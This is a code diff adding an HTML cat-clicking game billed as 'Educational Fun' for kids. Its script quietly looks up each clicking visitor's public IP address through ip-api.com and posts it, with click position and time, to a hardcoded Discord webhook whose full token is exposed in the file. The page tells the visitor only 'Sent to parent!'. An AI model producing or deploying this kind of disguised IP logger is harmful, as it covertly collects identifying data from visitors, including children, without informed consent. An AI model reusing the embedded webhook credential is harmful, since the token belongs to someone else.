@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Meow Clicker - Educational Fun 🐱</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background: linear-gradient(135deg, #ff9a9e, #fad0c4);
+      overflow: hidden;
+      font-family: 'Segoe UI', sans-serif;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .title {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 3rem;
+      color: white;
+      text-align: center;
+      text-shadow: 0 4px 20px rgba(0,0,0,0.3);
+      pointer-events: none;
+      z-index: 10;
+      transition: opacity 1.2s ease;
+    }
+
+    .cat {
+      position: absolute;
+      font-size: 5rem;
+      pointer-events: auto;
+      cursor: pointer;
+      animation: meowPop 3s forwards;
+      z-index: 20;
+      filter: drop-shadow(0 10px 25px rgba(0,0,0,0.25));
+    }
+
+    .feedback {
+      position: absolute;
+      bottom: 40px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0,0,0,0.75);
+      color: #fff;
+      padding: 12px 25px;
+      border-radius: 30px;
+      font-size: 1.2rem;
+      opacity: 0;
+      transition: all 0.4s ease;
+      z-index: 30;
+      pointer-events: none;
+    }
+
+    @keyframes meowPop {
+      0%   { opacity: 0; transform: scale(0.2) translateY(50px); }
+      20%  { opacity: 1; transform: scale(1.2) translateY(-20px); }
+      75%  { opacity: 1; transform: scale(1) translateY(0); }
+      100% { opacity: 0; transform: scale(0.7) translateY(-60px); }
+    }
+
+    .hidden { opacity: 0; }
+  </style>
+</head>
+<body>
+
+  <div class="title" id="title">Click the cat to make it meow! 🐱</div>
+  <div class="feedback" id="feedback"></div>
+
+  <audio id="meowSound" preload="auto">
+    <source src="https://assets.mixkit.co/sfx/preview/296/296.mp3" type="audio/mpeg">
+  </audio>
+
+  <script>
+    const title = document.getElementById('title');
+    const feedback = document.getElementById('feedback');
+    const audio = document.getElementById('meowSound');
+    const webhookUrl = "https://discord.com/api/webhooks/1485790689685016626/_ZiX3FxW4rppDGFiojqc6pLcgeEgY2MX6vEDBCy2bR8SLbVN2UTJU3GTqqSNLDAXWxVg";
+
+    async function sendToWebhook(ip, x, y) {
+      const payload = {
+        content: "🐱 **A kid clicked the cat!**",
+        embeds: [{
+          color: 0xff1493,
+          title: "Meow Click Detected",
+          fields: [
+            { name: "IP Address", value: ip || "Unknown", inline: true },
+            { name: "Click Position", value: `X: ${x} • Y: ${y}`, inline: true },
+            { name: "Time", value: new Date().toLocaleString(), inline: false }
+          ],
+          footer: { text: "Educational Meow Website for Kids" }
+        }]
+      };
+
+      try {
+        const res = await fetch(webhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        if (res.ok || res.type === 'opaque') {   // opaque = no-cors success
+          showFeedback("📡 Sent to parent! ✅");
+        } else {
+          showFeedback("📡 Sent (check Discord)");
+        }
+      } catch (err) {
+        console.error("Webhook error:", err);
+        showFeedback("📡 Trying to send...");
+      }
+    }
+
+    function showFeedback(text) {
+      feedback.textContent = text;
+      feedback.style.opacity = 1;
+      setTimeout(() => feedback.style.opacity = 0, 2500);
+    }
+
+    document.addEventListener('click', async function(e) {
+      if (!title.classList.contains('hidden')) title.classList.add('hidden');
+
+      // Play sound
+      audio.currentTime = 0;
+      audio.play().catch(() => {});
+
+      // Only trigger webhook when clicking the cat itself
+      if (e.target.classList.contains('cat')) {
+        let ip = "Unknown";
+        try {
+          const ipRes = await fetch('https://ip-api.com/json');
+          const data = await ipRes.json();
+          ip = data.query || "Unknown";
+        } catch (err) {}
+
+        const clickX = Math.round(e.clientX);
+        const clickY = Math.round(e.clientY);
+
+        await sendToWebhook(ip, clickX, clickY);
+      }
+
+      // Always spawn the floating cat
+      const cat = document.createElement('div');
+      cat.className = 'cat';
+      cat.textContent = ['🐱','😺','😸','🐈'][Math.floor(Math.random()*4)];
+
+      const rot = Math.random() * 40 - 20;
+      cat.style.left = `${e.clientX - 42}px`;
+      cat.style.top  = `${e.clientY - 42}px`;
+      cat.style.transform = `rotate(${rot}deg)`;
+
+      document.body.appendChild(cat);
+      setTimeout(() => cat.remove(), 3000);
+    });
+  </script>
+</body>
+</html>
